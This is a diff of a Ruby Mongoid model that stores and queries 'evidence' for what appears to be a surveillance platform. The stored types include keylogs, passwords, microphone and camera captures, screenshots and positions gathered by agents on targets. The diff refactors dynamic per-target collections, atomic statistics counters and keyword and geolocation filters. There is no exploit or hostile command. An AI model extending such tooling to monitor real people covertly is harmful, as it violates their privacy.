@@ -1,96 +1,138 @@
 require 'mongoid'
-require_relative '../shard'
-
 require 'rcs-common/keywords'
+require_relative '../shard'
 
 #module RCS
 #module DB
 
-class Evidence
+
+module Evidence
   extend RCS::Tracer
 
   TYPES = ["addressbook", "application", "calendar", "call", "camera", "chat", "clipboard", "device",
            "file", "keylog", "position", "message", "mic", "mouse", "password", "print", "screenshot", "url"]
 
-  def self.collection_name(target)
-    "evidence.#{target}"
+  STAT_EXCLUSION = ['filesystem', 'info', 'command', 'ip']
+
+  def self.included(base)
+    base.field :da, type: Integer                      # date acquired
+    base.field :dr, type: Integer                      # date received
+    base.field :type, type: String
+    base.field :rel, type: Integer, default: 0         # relevance (tag)
+    base.field :blo, type: Boolean, default: false     # blotter (report)
+    base.field :note, type: String
+    base.field :aid, type: String                      # agent BSON_ID
+    base.field :data, type: Hash
+    base.field :kw, type: Array, default: []           # keywords for full text search
+
+    # store_in collection: Evidence.collection_name('#{target}')
+    base.store_in collection: -> { self.collection_name }
+
+    base.after_create :create_callback
+    base.before_destroy :destroy_callback
+
+    base.index({type: 1}, {background: true})
+    base.index({da: 1}, {background: true})
+    base.index({dr: 1}, {background: true})
+    base.index({aid: 1}, {background: true})
+    base.index({rel: 1}, {background: true})
+    base.index({blo: 1}, {background: true})
+    base.index({kw: 1}, {background: true})
+
+    base.index({'data.position' => "2dsphere"}, {background: true})
+
+    base.shard_key :type, :da, :aid
+    base.validates_presence_of :type, :da, :aid
+
+    base.scope :positions, base.where(type: 'position')
+
+    base.extend ClassMethods
   end
 
-  def self.collection_class(target)
+  def create_callback
+    return if STAT_EXCLUSION.include? self.type
+    agent = Item.find self.aid
+    agent.stat.inc(:"evidence.#{self.type}", 1)
+    agent.stat.inc(:"dashboard.#{self.type}", 1)
+    agent.stat.inc(:size, self.data.to_s.length)
+    agent.stat.inc(:grid_size, self.data[:_grid_size]) unless self.data[:_grid].nil?
+    # update the target of this agent
+    target = agent.get_parent
+    target.stat.inc(:"evidence.#{self.type}", 1)
+    target.stat.inc(:"dashboard.#{self.type}", 1)
+    target.stat.inc(:size, self.data.to_s.length)
+    target.stat.inc(:grid_size, self.data[:_grid_size]) unless self.data[:_grid].nil?
+    # update the operation of this agent
+    operation = target.get_parent
+    operation.stat.inc(:size, self.data.to_s.length)
+    operation.stat.inc(:grid_size, self.data[:_grid_size]) unless self.data[:_grid].nil?
+  rescue Exception => e
+    trace :error, "Cannot update statisting while creating evidence #{e.message}"
+  end
 
-    class_definition = <<-END
-      class Evidence_#{target}
-        include Mongoid::Document
-
-        field :da, type: Integer                      # date acquired
-        field :dr, type: Integer                      # date received
-        field :type, type: String
-        field :rel, type: Integer, default: 0         # relevance (tag)
-        field :blo, type: Boolean, default: false     # blotter (report)
-        field :note, type: String
-        field :aid, type: String                      # agent BSON_ID
-        field :data, type: Hash
-        field :kw, type: Array, default: []           # keywords for full text search
-
-        store_in collection: Evidence.collection_name('#{target}')
-
-        after_create :create_callback
-        before_destroy :destroy_callback
-
-        index({type: 1}, {background: true})
-        index({da: 1}, {background: true})
-        index({dr: 1}, {background: true})
-        index({aid: 1}, {background: true})
-        index({rel: 1}, {background: true})
-        index({blo: 1}, {background: true})
-        index({kw: 1}, {background: true})
-        shard_key :type, :da, :aid
-
-        STAT_EXCLUSION = ['filesystem', 'info', 'command', 'ip']
-
-        protected
-
-        def create_callback
-          return if STAT_EXCLUSION.include? self.type
-          agent = Item.find self.aid
-          agent.stat.evidence ||= {}
-          agent.stat.evidence[self.type] ||= 0
-          agent.stat.evidence[self.type] += 1
-          agent.stat.dashboard ||= {}
-          agent.stat.dashboard[self.type] ||= 0
-          agent.stat.dashboard[self.type] += 1
-          agent.stat.size += self.data.to_s.length
-          agent.stat.grid_size += self.data[:_grid_size] unless self.data[:_grid].nil?
-          agent.save
-          # update the target of this agent
-          agent.get_parent.restat
-        end
-
-        def destroy_callback
-          agent = Item.find self.aid
-          # drop the file (if any) in grid
-          unless self.data['_grid'].nil?
-            RCS::DB::GridFS.delete(self.data['_grid'], agent.path.last.to_s) rescue nil
-          end
-        end
-      end
-    END
-    
-    classname = "Evidence_#{target}"
-    
-    if self.const_defined? classname.to_sym
-      klass = eval classname
-    else
-      eval class_definition
-      klass = eval classname
+  def destroy_callback
+    unless self.data['_grid'].nil?
+      RCS::DB::GridFS.delete(self.data['_grid'], agent.path.last.to_s) rescue nil
     end
-    
-    return klass
+
+    return if STAT_EXCLUSION.include? self.type
+    agent = Item.find self.aid
+    return unless agent
+    agent.stat.inc(:"evidence.#{self.type}", -1)
+    agent.stat.inc(:size, -self.data.to_s.length)
+    agent.stat.inc(:grid_size, -self.data['_grid_size']) unless self.data['_grid'].nil?
+    # update the target of this agent
+    target = agent.get_parent
+    target.stat.inc(:"evidence.#{self.type}", -1)
+    target.stat.inc(:size, -self.data.to_s.length)
+    target.stat.inc(:grid_size, -self.data[:_grid_size]) unless self.data[:_grid].nil?
+    # update the operation of this agent
+    operation = target.get_parent
+    operation.stat.inc(:size, -self.data.to_s.length)
+    operation.stat.inc(:grid_size, -self.data[:_grid_size]) unless self.data[:_grid].nil?
+  rescue Exception => e
+    trace :error, "Cannot update statisting while deleting evidence #{e.message}"
   end
 
-  def self.dynamic_new(target_id)
-    klass = self.collection_class(target_id)
-    return klass.new
+  # #TODO: rename into self.target (just like Aggregate#target)
+  def self.collection_class(target)
+    target_id = target.respond_to?(:id) ? target.id : target
+    dynamic_classname = "Evidence#{target_id}"
+
+    if const_defined? dynamic_classname
+      const_get dynamic_classname
+    else
+      c = Class.new do
+        extend RCS::Tracer
+        include RCS::Tracer
+        include Mongoid::Document
+        include RCS::DB::Proximity
+        include Evidence
+      end
+      c.instance_variable_set '@target_id', target_id
+      const_set(dynamic_classname, c)
+    end
+  end
+
+  module ClassMethods
+    def collection_name
+      raise "Missing target id. Maybe you're trying to instantiate Evidence without using Evidence#target." unless @target_id
+      "evidence.#{@target_id}"
+    end
+
+    def create_collection
+      # create the collection for the target's evidence and shard it
+      db = RCS::DB::DB.instance.mongo_connection
+      collection = db.collection self.collection.name
+      # ensure indexes
+      self.create_indexes
+      # enable sharding only if not enabled
+      RCS::DB::Shard.set_key(collection, {type: 1, da: 1, aid: 1}) unless collection.stats['sharded']
+    end
+  end
+
+  def self.dynamic_new(target)
+    collection_class(target).new
   end
 
   def self.deep_copy(src, dst)
@@ -136,7 +178,6 @@ class Evidence
 
     return num_evidence
   end
-
 
   def self.filtered_count(params)
 
@@ -194,45 +235,88 @@ class Evidence
     filter_hash[date.lte] = filter.delete('to') if filter.has_key? 'to'
 
     # custom filters for info
-    parse_info_keywords(filter, filter_hash) if filter.has_key? 'info'
+    if filter.has_key?('info')
+      info = filter.delete('info')
+      # backward compatibility
+      info = [info].flatten.compact
 
-    #filter on note
-    if filter['note']
-      note = filter.delete('note')
-      filter_hash[:note] = Regexp.new("#{note}", Regexp::IGNORECASE)
-      filter_hash[:kw.all] = note.keywords
+      filter_for_keywords(info, filter_hash)
+      filter_for_position(info, filter_hash)
+    end
+
+    # filter on note
+    groups_of_words = filter.delete('note')
+    # backward compatibility: a string may arrive (instead of an array)
+    groups_of_words = [groups_of_words].flatten.compact
+    # remove empty string from the array
+    groups_of_words = groups_of_words.select { |string| !string.blank? }
+
+    if !groups_of_words.empty?
+      filter_hash['$or'] ||= []
+      filter_hash['$or'].concat groups_of_words.map { |words| {'kw' => {'$all' => words.keywords}} }
+      regexp = groups_of_words.map { |words| "(#{words})"}.join('|')
+      filter_hash['note'] = /#{regexp}/i
     end
 
     return filter, filter_hash, target
   end
 
-  def self.parse_info_keywords(filter, filter_hash)
+  # Check if the first string of the "info" filter is in the form of
+  # field_1:value_1,field_2:value_2,...,field_x:value_y
+  def self.filter_info_has_key_values? info
+    regexp = /^([a-zA-Z]+:[^\,]+(\,|\,\s|$))+$/
+    info.size == 1 && info.first =~ regexp
+  end
 
-    info = filter.delete('info')
+  def self.each_filter_key_value string
+    key_values = string.split(',')
+    key_values.each do |kv|
+      key, value = kv.split(':').map(&:strip)
+      key.downcase!
 
-    # check if it's in the form of specific field name:
-    #   field1:value1,field2:value2,etc,etc
-    #
-    if /[[:alpha:]]:[[:alpha:]]/ =~ info
-      key_values = info.split(',')
-      key_values.each do |kv|
-        k, v = kv.split(':')
-        k.downcase!
+      next if value.blank?
+      # special case for email (the field is called "rcpt" but presented as "to")
+      key = 'rcpt' if key == 'to'
+      yield(key, value) if block_given?
+    end
+  end
 
-        # special case for email (the field is called "rcpt" but presented as "to")
-        k = 'rcpt' if k == 'to'
+  # If the info array contains a string like "lon:40,lat:10,r:34" than adds
+  # a $near filter for the "data.position" attribute.
+  def self.filter_for_position(info, filter_hash)
+    return unless filter_info_has_key_values?(info)
+
+    lat, lon, r = nil
+
+    each_filter_key_value(info.first) do |k, v|
+      lat = v if k == 'lat'
+      lon = v if k == 'lon'
+      r   = v if k == 'r'
+    end
+
+    return unless lat and lon
+
+    filter_hash['geoNear_coordinates'] = [lon, lat].map(&:to_f)
+    filter_hash['geoNear_accuracy'] = r.to_i if r
+  end
+
+  def self.filter_for_keywords(info, filter_hash)
+    if filter_info_has_key_values?(info)
+      each_filter_key_value(info.first) do |k, v|
+        # special case for $near search
+        next if %w[lat lon r].include?(k)
 
         filter_hash["data.#{k}"] = Regexp.new("#{v}", Regexp::IGNORECASE)
         # add the keyword search to cut the nscanned item
         filter_hash[:kw.all] ||= v.keywords
       end
-    else
+    elsif !info.empty?
       # otherwise we use it for full text search with keywords
-      # the search matches if all the keywords are matched inside the evidence
-      filter_hash[:kw.all] = info.keywords
+      groups_of_words = info.map { |words| words.strip.keywords }
+
+      filter_hash['$or'] ||= []
+      filter_hash['$or'].concat groups_of_words.map { |words| {'kw' => {'$all' => words}} }
     end
-  rescue Exception => e
-    trace :error, "Invalid filter for data [#{e.message}], ignoring..."
   end
 
   def self.offload_move_evidence(params)
@@ -242,7 +326,7 @@ class Evidence
 
     # moving an agent implies that all the evidence are moved to another target
     # we have to remove all the aggregates created from those evidence on the old target
-    Aggregate.collection_class(old_target[:_id]).destroy_all(aid: agent[:_id].to_s)
+    Aggregate.target(old_target[:_id]).destroy_all(aid: agent[:_id].to_s)
 
     evidences = Evidence.collection_class(old_target[:_id]).where(:aid => agent[:_id])
 
@@ -296,8 +380,14 @@ class Evidence
 
     # we moved aggregates, have to rebuild the summary
     if LicenseManager.instance.check :correlation
-      Aggregate.collection_class(old_target[:_id]).rebuild_summary
+      Aggregate.target(old_target[:_id]).rebuild_summary
     end
+
+    # recalculate stats
+    old_target.restat
+    old_target.get_parent.restat
+    target.restat
+    target.get_parent.restat
 
     trace :info, "Evidence Move: completed for #{agent.name}"
   end
@@ -329,14 +419,14 @@ class Evidence
     trace :info, "Deleting evidence for target #{target.name} done."
 
     # recalculate the stats for each agent of this target
-    agents = Item.where(_kind: 'agent').in(path: [target._id])
-    agents.each do |a|
-      ::Evidence::TYPES.each do |type|
-        count = Evidence.collection_class(target[:_id]).where({aid: a._id.to_s, type: type}).count
-        a.stat.evidence[type] = count
-      end
-      a.save
-    end
+    agents = Item.agents.in(path: [target._id])
+    agents.each {|a| a.restat }
+
+    # recalculate for the target
+    target.restat
+
+    # recalculate for the operation
+    target.get_parent.restat
   end
 
 end
